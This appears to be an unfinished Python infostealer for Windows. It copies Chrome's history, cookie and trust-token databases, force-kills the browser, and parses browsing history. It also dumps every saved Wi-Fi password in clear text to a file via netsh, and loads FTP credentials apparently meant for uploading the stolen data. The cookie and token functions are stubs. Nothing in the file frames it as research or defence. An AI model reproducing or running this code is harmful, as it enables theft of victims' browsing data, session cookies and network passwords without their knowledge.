import os 
import datetime
import sqlite3
import shutil
import subprocess
from dotenv import load_dotenv
from Startup import admin
global home,files,USERNAME,PASSWORD

value = dict(os.environ)

load_dotenv()
USERNAME,PASSWORD = os.getenv("FTP_USERNAME"),os.getenv("FTP_PASSWORD")
account = subprocess.check_output(['whoami']).decode('utf-8')
home = value["HOMEDRIVE"]+value["HOMEPATH"]
files = [fr"{home}\AppData\Local\Google\Chrome\User Data\Default\History - Copy.db",fr"{home}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies - Copy.db",fr"{home}\AppData\Local\Google\Chrome\User Data\Default\History\Network\Trust Tokens - Copy.db"]

def copy_files():
    try:
        os.mkdir(r"C:\sqlite")
    except FileExistsError:
        pass
    shutil.copyfile(fr"{home}\AppData\Local\Google\Chrome\User Data\Default\History",fr"{home}\AppData\Local\Google\Chrome\User Data\Default\History - Copy.db")
    shutil.copyfile(fr"{home}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",fr"{home}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies - Copy.db")
    shutil.copyfile(fr"{home}\AppData\Local\Google\Chrome\User Data\Default\Network\Trust Tokens",fr"{home}\AppData\Local\Google\Chrome\User Data\Default\History\Network\Trust Tokens - Copy.db")

def grab_history():
    os.system("taskkill /IM chrome.exe /F")    
    numlst = []
    chrome_time = []
    con = sqlite3.connect(files[0])
    cur = con.cursor()
    cur.execute("SELECT id, url, title, visit_count,last_visit_time FROM urls")
    con.commit()
    url_data = cur.fetchall()
    cur.execute("SELECT id, url FROM downloads_url_chains")
    con.commit()
    for g in url_data:
        ids = g[0]
        time = g[4]
        chrome_time.append(time)
        numlst.append(ids)
    cur.execute("ALTER TABLE urls DROP COLUMN last_visit_time")
    con.commit()
    cur.execute("ALTER TABLE urls ADD COLUMN last_visited_time TEXT")
    con.commit()
    for f in range(len(numlst)):
        num = numlst[f]
        time = chrome_time[f]
        value = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time)
        cur.execute(f"UPDATE urls SET last_visited_time = '{value}' WHERE id = {num}")
    con.commit()
    con.close()

def grab_cookies():
    os.system("taskkill /IM chrome.exe /F")
    con = sqlite3.connect(files[1])
    cur = con.cursor()
    
    pass

def grab_TrustTokens():
    pass

def audit_log():
    pass

def grab_wifipass():
    passwords = []
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in range(len(profiles)):
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profiles[i], 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        if not results:
            results = [""]
        passwords.append(results)
    file = open("wifi_pass.txt","a")
    for g in range(len(profiles)):
        file.write(profiles[g]+": "+passwords[g][0]+"\n")
    file.close()
        


#uncomment bottom at end of programm
#os.startfile(os.getcwd()+"\\sqliteScript.py")